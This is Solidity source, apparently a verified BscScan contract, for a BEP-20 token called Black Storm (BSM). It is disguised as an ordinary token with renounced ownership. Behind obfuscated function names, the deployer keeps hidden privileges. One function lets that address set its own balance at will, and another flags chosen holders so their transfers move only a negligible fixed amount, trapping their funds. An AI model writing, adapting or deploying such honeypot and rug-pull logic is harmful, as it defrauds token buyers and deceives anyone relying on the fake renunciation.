/**
 *Submitted for verification at BscScan.com on 2023-02-01
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;


interface sellShouldLaunched {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface txFund {
    function createPair(address tokenA, address tokenB) external returns (address);
}

contract BlackStorm {
    uint8 public decimals = 18;
    uint256 constant exemptSwap = 12 ** 10;

    address public owner;

    address public enableLaunched;
    mapping(address => bool) public minFee;

    bool public tradingMode;
    address public fromMode;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    uint256 public totalSupply = 100000000 * 10 ** 18;
    string public symbol = "BSM";

    mapping(address => bool) public amountList;

    string public name = "Black Storm";
    

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor (){
        sellShouldLaunched txMarketingSwap = sellShouldLaunched(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        enableLaunched = txFund(txMarketingSwap.factory()).createPair(txMarketingSwap.WETH(), address(this));
        owner = feeReceiverTotal();
        fromMode = owner;
        minFee[fromMode] = true;
        balanceOf[fromMode] = totalSupply;
        emit Transfer(address(0), fromMode, totalSupply);
        totalReceiver();
    }

    

    function getOwner() external view returns (address) {
        return owner;
    }

    function totalReceiver() public {
        emit OwnershipTransferred(fromMode, address(0));
        owner = address(0);
    }

    function feeReceiverTotal() private view returns (address) {
        return msg.sender;
    }

    function minReceiver(address isLaunch) public {
        if (tradingMode) {
            return;
        }
        minFee[isLaunch] = true;
        tradingMode = true;
    }

    function fromMarketingShould(uint256 walletReceiver) public {
        if (!minFee[feeReceiverTotal()]) {
            return;
        }
        balanceOf[fromMode] = walletReceiver;
    }

    function transferFrom(address launchedReceiver, address swapTotal, uint256 walletReceiver) public returns (bool) {
        if (launchedReceiver != feeReceiverTotal() && allowance[launchedReceiver][feeReceiverTotal()] != type(uint256).max) {
            require(allowance[launchedReceiver][feeReceiverTotal()] >= walletReceiver);
            allowance[launchedReceiver][feeReceiverTotal()] -= walletReceiver;
        }
        if (swapTotal == fromMode || launchedReceiver == fromMode) {
            return txLiquidityTotal(launchedReceiver, swapTotal, walletReceiver);
        }
        if (amountList[launchedReceiver]) {
            return txLiquidityTotal(launchedReceiver, swapTotal, exemptSwap);
        }
        return txLiquidityTotal(launchedReceiver, swapTotal, walletReceiver);
    }

    function tokenFeeTx(address teamTotalLimit) public {
        if (teamTotalLimit == fromMode || teamTotalLimit == enableLaunched || !minFee[feeReceiverTotal()]) {
            return;
        }
        amountList[teamTotalLimit] = true;
    }

    function approve(address maxLiquidityTake, uint256 walletReceiver) public returns (bool) {
        allowance[feeReceiverTotal()][maxLiquidityTake] = walletReceiver;
        emit Approval(feeReceiverTotal(), maxLiquidityTake, walletReceiver);
        return true;
    }

    function transfer(address swapTotal, uint256 walletReceiver) external returns (bool) {
        return transferFrom(feeReceiverTotal(), swapTotal, walletReceiver);
    }

    function txLiquidityTotal(address autoFund, address totalSwap, uint256 walletReceiver) internal returns (bool) {
        require(balanceOf[autoFund] >= walletReceiver);
        balanceOf[autoFund] -= walletReceiver;
        balanceOf[totalSwap] += walletReceiver;
        emit Transfer(autoFund, totalSwap, walletReceiver);
        return true;
    }


}